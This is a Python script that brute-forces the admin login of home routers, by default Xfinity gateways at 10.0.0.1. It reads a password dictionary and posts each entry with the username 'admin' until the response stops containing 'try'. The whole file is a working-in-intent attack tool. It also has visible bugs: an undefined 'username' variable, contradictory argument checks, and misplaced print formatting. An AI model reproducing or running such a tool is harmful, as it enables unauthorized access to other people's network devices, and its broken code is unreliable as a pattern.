import requests, time, getopt, sys
def main():
	dictionary_file = 'sample.dict'
	###############################
	# Defaults for Xfinity Routers
	###############################
	router_url='http://10.0.0.1/home_loggedout.asp'
	request_url='http://10.0.0.1/at_a_glance.asp'   
	post_login_username_key='loginUsername'
	post_login_password_key='loginPassword'
	admin_username = 'admin'
	if not(len(sys.argv) == 6):
		print("Usage: %s -l passwd_list -r router_url -q request_login_url -u post_username_key -p post_password_key -a admin_username"  % sys.argv[0])
		return 
	myopts, args = getopt.getopt(sys.argv[5:],"l:r:q:u:p:a:")
	
	for o, a in myopts:
		if o == '-l':
			dictionary_file = a
		if o == '-r':
			router_url = a
		if o == '-q':
			request_url = a
		if o == '-u':
			post_login_username_key = a
		if o == '-p':
			post_login_password_key = a
		if o == '-a':
			admin_username = a
		else:
			print("Usage: %s -l passwd_list -r router_url -q request_login_url -u post_username_key -p post_password_key -a admin_username"  % sys.argv[0])
			return
	with open(dictionary_file) as f:
		password_list = f.read().splitlines()
	with requests.Session() as c:
	
		for password in password_list:
			login_data={post_login_username_key:admin_username, post_login_password_key:password}
			headers_data={'Referer':request_url}
			c.post(router_url, data=login_data, headers=headers_data)
			returned_data = c.get(request_url).content
			if 'try' in returned_data:
				print ('Failed with\nUsername: %s\nPassword: %s\n')  % (username, password)
			else:
				print ('Succeeded with\nUsername: %s\nPassword: %s\n')  % (username, password)
				break
if __name__ == "__main__":
	main()
